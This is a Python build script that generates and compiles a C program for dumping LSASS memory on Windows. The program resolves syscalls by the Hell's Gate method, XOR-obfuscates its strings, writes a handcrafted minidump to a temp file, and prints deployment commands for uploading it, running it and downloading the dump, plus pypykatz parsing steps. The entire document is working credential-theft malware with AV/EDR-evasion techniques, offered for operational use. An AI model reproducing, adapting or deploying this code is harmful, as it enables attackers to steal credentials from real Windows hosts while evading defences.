#!/usr/bin/env python3
"""
gen_minidump.py — Direct-syscall LSASS minidump.
No dbghelp.dll, no MiniDumpWriteDump — manual minidump format.
NtOpenProcess + NtQueryVirtualMemory + NtReadVirtualMemory via Hell's Gate.
Output: minidump.exe  (deploy as SYSTEM or admin+SeDebugPrivilege)
Parse:  pypykatz lsa minidump lsass.dat
"""
import os, sys, subprocess, shutil, tempfile

ROOT = os.path.dirname(os.path.abspath(__file__))
OUT  = os.path.join(ROOT, 'minidump.exe')

KEY = 0x4D
def enc(s): return ','.join(str(ord(c) ^ KEY) for c in s)

DUMP_PATH  = 'C:\\Windows\\Temp\\lsass.dat\x00'
LSASS_NAME = 'lsass.exe\x00'

dump_enc  = enc(DUMP_PATH);  dump_len  = len(DUMP_PATH)
lsass_enc = enc(LSASS_NAME); lsass_len = len(LSASS_NAME)

c_src = f"""
#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

typedef LONG NTSTATUS;
#define NT_SUCCESS(s)  ((NTSTATUS)(s) >= 0)
#define MEM_COMMIT     0x1000
#define PAGE_NOACCESS  0x01
#define PAGE_GUARD     0x100

/* 64-bit MEMORY_BASIC_INFORMATION with PartitionId (Win10+) */
typedef struct {{
    PVOID  BaseAddress;
    PVOID  AllocationBase;
    DWORD  AllocationProtect;
    USHORT PartitionId;
    USHORT _pad0;
    SIZE_T RegionSize;
    DWORD  State;
    DWORD  Protect;
    DWORD  Type;
    DWORD  _pad1;
}} MEMBASIC; /* 48 bytes */

/* ══ Hell's Gate SSN resolver ══════════════════════════════════════════ */
typedef struct {{ DWORD rva; const char *name; }} NtExp;
static int cmp_rva(const void *a, const void *b) {{
    DWORD ra=((NtExp*)a)->rva, rb=((NtExp*)b)->rva;
    return (ra>rb)-(ra<rb);
}}
static DWORD ssn_of(HMODULE ntdll, const char *fn) {{
    BYTE *base=(BYTE*)ntdll;
    IMAGE_DOS_HEADER       *dos=(IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS64     *nt =(IMAGE_NT_HEADERS64*)(base+dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY *exp=(IMAGE_EXPORT_DIRECTORY*)(base+
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD *names=(DWORD*)(base+exp->AddressOfNames);
    WORD  *ords =(WORD*) (base+exp->AddressOfNameOrdinals);
    DWORD *funcs=(DWORD*)(base+exp->AddressOfFunctions);
    NtExp *arr=(NtExp*)malloc(exp->NumberOfNames*sizeof(NtExp));
    if (!arr) return ~0u;
    int cnt=0;
    for (DWORD i=0;i<exp->NumberOfNames;i++) {{
        const char *n=(const char*)(base+names[i]);
        if (n[0]=='N'&&n[1]=='t') {{ arr[cnt].rva=funcs[ords[i]]; arr[cnt].name=n; cnt++; }}
    }}
    qsort(arr,cnt,sizeof(NtExp),cmp_rva);
    DWORD ssn=~0u;
    for (int i=0;i<cnt;i++) {{
        if (strcmp(arr[i].name,fn)) continue;
        BYTE *s=base+arr[i].rva;
        if (s[0]==0x4C&&s[1]==0x8B&&s[2]==0xD1&&s[3]==0xB8) {{ ssn=*(DWORD*)(s+4); break; }}
        for (int d=1;d<10;d++) {{
            if (i-d>=0) {{
                BYTE *t=base+arr[i-d].rva;
                if (t[0]==0x4C&&t[1]==0x8B&&t[2]==0xD1&&t[3]==0xB8) {{ ssn=*(DWORD*)(t+4)+d; break; }}
            }}
            if (ssn!=~0u) break;
            if (i+d<cnt) {{
                BYTE *t=base+arr[i+d].rva;
                if (t[0]==0x4C&&t[1]==0x8B&&t[2]==0xD1&&t[3]==0xB8) {{ ssn=*(DWORD*)(t+4)-d; break; }}
            }}
            if (ssn!=~0u) break;
        }}
        break;
    }}
    free(arr);
    return ssn;
}}

/* ══ Bootstrap naked stub (NtProtectVirtualMemory SSN 0x50) ═══════════ */
__attribute__((naked)) void _nt_protect_hc(void) {{
    __asm__("mov %rcx,%r10\\n mov $0x50,%eax\\n syscall\\n ret\\n");
}}

static BYTE *g_stubs=NULL;
static int   g_scount=0;
static void *make_stub(DWORD ssn) {{
    BYTE *s=g_stubs+g_scount++*16;
    s[0]=0x4C; s[1]=0x8B; s[2]=0xD1;
    s[3]=0xB8; *(DWORD*)(s+4)=ssn;
    s[8]=0x0F; s[9]=0x05; s[10]=0xC3;
    return s;
}}

typedef NTSTATUS(*FnProt)(HANDLE,PVOID*,PSIZE_T,ULONG,PULONG);
typedef NTSTATUS(*FnOpen)(PHANDLE,ACCESS_MASK,PVOID,PVOID);
typedef NTSTATUS(*FnQVM )(HANDLE,PVOID,ULONG,PVOID,SIZE_T,PSIZE_T);
typedef NTSTATUS(*FnRVM )(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T);

typedef struct {{ ULONG Len; HANDLE Root; PVOID ObjName; ULONG Attrs; PVOID SD; PVOID SQoS; }} OBJ_ATTR;
typedef struct {{ HANDLE Proc; HANDLE Thread; }} CLIENT_ID;

/* ══ Find lsass PID ════════════════════════════════════════════════════ */
static DWORD find_lsass(const char *name) {{
    WCHAR wname[32]={{0}};
    for (int i=0; name[i]; i++) wname[i]=(WCHAR)(unsigned char)name[i];
    HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if (snap==INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe={{sizeof(pe)}};
    DWORD pid=0;
    if (Process32FirstW(snap,&pe)) do {{
        if (_wcsicmp(pe.szExeFile,wname)==0) {{ pid=pe.th32ProcessID; break; }}
    }} while (Process32NextW(snap,&pe));
    CloseHandle(snap);
    return pid;
}}

/* ══ Minidump structures (manual layout, exact sizes) ═════════════════ */
#pragma pack(push,4)
typedef struct {{ /* 32 bytes */
    ULONG32 Sig; ULONG32 Ver; ULONG32 NumStreams;
    ULONG32 DirRva; ULONG32 Checksum; ULONG32 Time; ULONG64 Flags;
}} MD_HDR;
typedef struct {{ ULONG32 Type; ULONG32 Size; ULONG32 Rva; }} MD_DIR; /* 12 bytes */
typedef struct {{ /* 48 bytes */
    USHORT  Arch; USHORT Level; USHORT Rev;
    UCHAR   NumProc; UCHAR ProdType;
    ULONG32 Major; ULONG32 Minor; ULONG32 Build; ULONG32 Platform;
    ULONG32 CSDRva; USHORT Suite; USHORT Res2;
    ULONG64 ProcFeat[2];
}} MD_SYS;
typedef struct {{ /* 108 bytes */
    ULONG64 Base;
    ULONG32 Size;
    ULONG32 Checksum;
    ULONG32 Time;
    ULONG32 NameRva;
    ULONG32 VsInfo[13]; /* VS_FIXEDFILEINFO zeroed */
    ULONG32 CvSize;  ULONG32 CvRva;
    ULONG32 MscSize; ULONG32 MscRva;
    ULONG64 Res0; ULONG64 Res1;
}} MD_MOD;
typedef struct {{ ULONG64 Start; ULONG64 Sz; }} MD_MEM64; /* 16 bytes */
#pragma pack(pop)

typedef struct {{ PVOID Base; DWORD Size; PVOID Entry; }} MODINFO;
typedef BOOL  (WINAPI*FnEPM)(HANDLE,HMODULE*,DWORD,LPDWORD);
typedef DWORD (WINAPI*FnGMN)(HANDLE,HMODULE,LPWSTR,DWORD);
typedef BOOL  (WINAPI*FnGMI)(HANDLE,HMODULE,MODINFO*,DWORD);

typedef struct {{ ULONG64 base; ULONG32 size; ULONG32 ts; WCHAR name[MAX_PATH]; }} ModRec;
typedef struct {{ ULONG64 addr; ULONG64 size; }} Reg;

static void write_all(HANDLE f, const void *buf, DWORD sz) {{
    DWORD wr=0;
    WriteFile(f, buf, sz, &wr, NULL);
}}
static void write_zero(HANDLE f, DWORD sz) {{
    BYTE z[256]={{0}};
    while (sz>0) {{ DWORD c=sz<256?sz:256; write_all(f,z,c); sz-=c; }}
}}

int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {{
    (void)h;(void)p;(void)cmd;(void)show;

    /* decode strings */
    static const BYTE DENC[]={{{dump_enc}}};  static const int DLEN={dump_len};
    static const BYTE LENC[]={{{lsass_enc}}}; static const int LLEN={lsass_len};
    static const BYTE KEY=0x{KEY:02X};
    char out_path[MAX_PATH]={{0}}, lsass_name[32]={{0}};
    for (int i=0;i<DLEN-1;i++) out_path[i]   =(char)(DENC[i]^KEY);
    for (int i=0;i<LLEN-1;i++) lsass_name[i] =(char)(LENC[i]^KEY);

    /* setup stubs */
    g_stubs=(BYTE*)VirtualAlloc(NULL,4096,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    if (!g_stubs) return 1;
    HMODULE ntdll=GetModuleHandleA("ntdll.dll");
    DWORD ssn_open=ssn_of(ntdll,"NtOpenProcess");          if(ssn_open==~0u) ssn_open=0x26;
    DWORD ssn_qvm =ssn_of(ntdll,"NtQueryVirtualMemory");   if(ssn_qvm ==~0u) ssn_qvm =0x23;
    DWORD ssn_rvm =ssn_of(ntdll,"NtReadVirtualMemory");    if(ssn_rvm ==~0u) ssn_rvm =0x3F;
    FnOpen NtOpen=(FnOpen)make_stub(ssn_open);
    FnQVM  NtQVM =(FnQVM) make_stub(ssn_qvm);
    FnRVM  NtRVM =(FnRVM) make_stub(ssn_rvm);
    {{ PVOID sp=g_stubs; SIZE_T ss=4096; ULONG sold=0;
       ((FnProt)_nt_protect_hc)((HANDLE)(LONG_PTR)-1,&sp,&ss,PAGE_EXECUTE_READ,&sold); }}

    /* find + open lsass */
    DWORD pid=find_lsass(lsass_name);
    if (!pid) return 2;
    OBJ_ATTR  oa ={{sizeof(oa)}};
    CLIENT_ID cid={{(HANDLE)(ULONG_PTR)pid,NULL}};
    HANDLE lh=NULL;
    if (!NT_SUCCESS(NtOpen(&lh,PROCESS_VM_READ|PROCESS_QUERY_INFORMATION,&oa,&cid))||!lh)
        return 3;

    /* load K32 module helpers dynamically */
    HMODULE k32=GetModuleHandleA("kernel32.dll");
    FnEPM EnumMods  =(FnEPM)GetProcAddress(k32,"K32EnumProcessModules");
    FnGMN GetModName=(FnGMN)GetProcAddress(k32,"K32GetModuleFileNameExW");
    FnGMI GetModInfo=(FnGMI)GetProcAddress(k32,"K32GetModuleInformation");
    if (!EnumMods||!GetModName||!GetModInfo) {{ CloseHandle(lh); return 4; }}

    /* enumerate modules */
    HMODULE mbufs[512]; DWORD needed=0;
    EnumMods(lh,mbufs,sizeof(mbufs),&needed);
    int nmod=(int)(needed/sizeof(HMODULE));
    if (nmod>512) nmod=512;

    ModRec *mods=(ModRec*)calloc(nmod,sizeof(ModRec));
    if (!mods) {{ CloseHandle(lh); return 5; }}
    for (int i=0;i<nmod;i++) {{
        MODINFO mi={{0}};
        GetModInfo(lh,mbufs[i],&mi,sizeof(mi));
        mods[i].base=(ULONG64)mi.Base;
        mods[i].size=mi.Size;
        /* read PE header to get timestamp */
        BYTE hbuf[0x400]={{0}}; SIZE_T rd=0;
        NtRVM(lh,mi.Base,hbuf,sizeof(hbuf),&rd);
        IMAGE_DOS_HEADER *dos2=(IMAGE_DOS_HEADER*)hbuf;
        if (dos2->e_magic==IMAGE_DOS_SIGNATURE && dos2->e_lfanew<0x380) {{
            IMAGE_NT_HEADERS64 *nt2=(IMAGE_NT_HEADERS64*)(hbuf+dos2->e_lfanew);
            if (nt2->Signature==IMAGE_NT_SIGNATURE)
                mods[i].ts=nt2->FileHeader.TimeDateStamp;
        }}
        GetModName(lh,mbufs[i],mods[i].name,MAX_PATH);
    }}

    /* enumerate committed readable memory regions */
    #define MAX_REGIONS 8192
    Reg *regs=(Reg*)malloc(MAX_REGIONS*sizeof(Reg));
    if (!regs) {{ free(mods); CloseHandle(lh); return 6; }}
    int nreg=0;
    for (PVOID addr=NULL; nreg<MAX_REGIONS; ) {{
        MEMBASIC mbi={{0}}; SIZE_T rlen=0;
        if (!NT_SUCCESS(NtQVM(lh,addr,0,&mbi,sizeof(mbi),&rlen))) break;
        if (mbi.State==MEM_COMMIT &&
            (mbi.Protect & 0xFF)!=PAGE_NOACCESS &&
            !(mbi.Protect & PAGE_GUARD)) {{
            regs[nreg].addr=(ULONG64)mbi.BaseAddress;
            regs[nreg].size=(ULONG64)mbi.RegionSize;
            nreg++;
        }}
        addr=(BYTE*)mbi.BaseAddress+mbi.RegionSize;
        if ((ULONG64)addr >= 0x00007FFFFFFEFFFFULL) break;
    }}

    /* ── Calculate minidump layout ─────────────────────────────────────
       [0]    MD_HDR    32 bytes
       [32]   MD_DIR×3  36 bytes
       [68]   MD_SYS    48 bytes
       [116]  ModList:  4 + nmod*108 + name_strings
       [?]    Mem64:    8-aligned, 16 + nreg*16
       [?]    RawMem
    ───────────────────────────────────────────────────────────────────── */
    ULONG32 sysinfo_off = 68;
    ULONG32 modlist_off = 116;

    /* pre-calc name string sizes */
    ULONG32 *name_rva=(ULONG32*)malloc(nmod*sizeof(ULONG32));
    ULONG32 names_base=modlist_off+4+(ULONG32)(nmod*108);
    ULONG32 names_used=0;
    for (int i=0;i<nmod;i++) {{
        name_rva[i]=names_base+names_used;
        int wlen=(int)wcslen(mods[i].name);
        ULONG32 entry=4+wlen*2;
        entry=(entry+3)&~3u;
        names_used+=entry;
    }}
    ULONG32 modlist_size=4+(ULONG32)(nmod*108)+names_used;

    ULONG32 mem64_off=modlist_off+modlist_size;
    if (mem64_off%8) mem64_off+=(8-mem64_off%8);
    ULONG32 mem64_size=16+(ULONG32)(nreg*16);
    ULONG64 rawmem_off=(ULONG64)mem64_off+mem64_size;

    /* open output file */
    HANDLE f=CreateFileA(out_path,GENERIC_WRITE,0,NULL,
                         CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    if (f==INVALID_HANDLE_VALUE) {{ free(name_rva);free(regs);free(mods);CloseHandle(lh);return 7; }}

    /* header */
    MD_HDR hdr={{0}};
    hdr.Sig=0x504d444d; hdr.Ver=0x0000a793; hdr.NumStreams=3;
    hdr.DirRva=32; hdr.Time=(ULONG32)GetTickCount();
    write_all(f,&hdr,sizeof(hdr));

    /* directory */
    MD_DIR dirs[3]={{
        {{7, sizeof(MD_SYS), sysinfo_off}},
        {{4, modlist_size,   modlist_off}},
        {{9, mem64_size,     mem64_off  }}
    }};
    write_all(f,dirs,sizeof(dirs));

    /* SystemInfoStream — hardcode Win11 24H2 */
    MD_SYS sys={{0}};
    sys.Arch=9; sys.Level=25; sys.Rev=0;
    sys.NumProc=1; sys.ProdType=1;
    sys.Major=10; sys.Minor=0; sys.Build=26200;
    sys.Platform=2;
    write_all(f,&sys,sizeof(sys));

    /* ModuleListStream */
    ULONG32 nmod32=(ULONG32)nmod;
    write_all(f,&nmod32,4);
    for (int i=0;i<nmod;i++) {{
        MD_MOD mod={{0}};
        mod.Base=mods[i].base;
        mod.Size=mods[i].size;
        mod.Time=mods[i].ts;
        mod.NameRva=name_rva[i];
        write_all(f,&mod,sizeof(mod));
    }}
    /* name strings (MINIDUMP_STRING: ULONG32 ByteCount + WCHAR[]) */
    for (int i=0;i<nmod;i++) {{
        int wlen=(int)wcslen(mods[i].name);
        ULONG32 bcount=(ULONG32)(wlen*2);
        write_all(f,&bcount,4);
        write_all(f,mods[i].name,bcount);
        ULONG32 total=4+bcount;
        ULONG32 aligned=(total+3)&~3u;
        if (aligned>total) write_zero(f,aligned-total);
    }}

    /* pad to mem64_off */
    {{
        ULONG64 cur=(ULONG64)(modlist_off+modlist_size);
        if (cur<mem64_off) write_zero(f,(DWORD)(mem64_off-cur));
    }}

    /* Memory64ListStream header */
    ULONG64 nreg64=(ULONG64)nreg;
    write_all(f,&nreg64,8);
    write_all(f,&rawmem_off,8);
    for (int i=0;i<nreg;i++) {{
        MD_MEM64 m={{regs[i].addr,regs[i].size}};
        write_all(f,&m,sizeof(m));
    }}

    /* raw memory — NtReadVirtualMemory region by region */
    BYTE *rbuf=(BYTE*)malloc(0x10000);
    if (!rbuf) {{ CloseHandle(f);free(name_rva);free(regs);free(mods);CloseHandle(lh);return 8; }}
    for (int i=0;i<nreg;i++) {{
        ULONG64 done=0, total=regs[i].size;
        while (done<total) {{
            SIZE_T chunk=total-done; if(chunk>0x10000) chunk=0x10000;
            SIZE_T bread=0;
            NTSTATUS st=NtRVM(lh,(PVOID)(regs[i].addr+done),rbuf,(SIZE_T)chunk,&bread);
            if (NT_SUCCESS(st)&&bread>0) {{
                write_all(f,rbuf,(DWORD)bread);
                if ((ULONG64)bread<chunk) write_zero(f,(DWORD)(chunk-(ULONG64)bread));
            }} else {{
                write_zero(f,(DWORD)chunk);
            }}
            done+=chunk;
        }}
    }}
    free(rbuf);

    CloseHandle(f);
    CloseHandle(lh);
    free(name_rva); free(regs); free(mods);
    return 0;
}}
"""

tmp = tempfile.mkdtemp(prefix='minidump_build_')
try:
    src = os.path.join(tmp, 'minidump.c')
    exe = os.path.join(tmp, 'minidump.exe')
    open(src, 'w').write(c_src)

    print('[*] Compiling minidump.exe (direct syscalls, no dbghelp) ...')
    r = subprocess.run([
        'x86_64-w64-mingw32-gcc', '-O2', '-s', '-mwindows',
        '-o', exe, src,
        '-lkernel32',
        '-Wl,--no-seh', '-fno-ident', '-fno-asynchronous-unwind-tables',
    ], capture_output=True, text=True)

    if r.returncode != 0:
        dbg = os.path.join(ROOT, 'minidump_debug.c')
        open(dbg, 'w').write(c_src)
        print(f'[!] Build failed — source saved to {dbg}')
        print(r.stderr[-4000:])
        sys.exit(1)

    shutil.copy(exe, OUT)
finally:
    shutil.rmtree(tmp, ignore_errors=True)

print(f'[+] {OUT}  ({os.path.getsize(OUT):,} bytes)')
print()
print('Deploy:')
print(f'  upload {OUT} C:\\Windows\\Temp\\minidump.exe')
print(f'  shell C:\\Windows\\Temp\\minidump.exe')
print(f'  download C:\\Windows\\Temp\\lsass.dat')
print()
print('If exit code 3: lsass is PPL-protected — check RunAsPPL first:')
print('  powershell (Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa).RunAsPPL')
print()
print('Parse on Kali:')
print('  pypykatz lsa minidump lsass.dat')
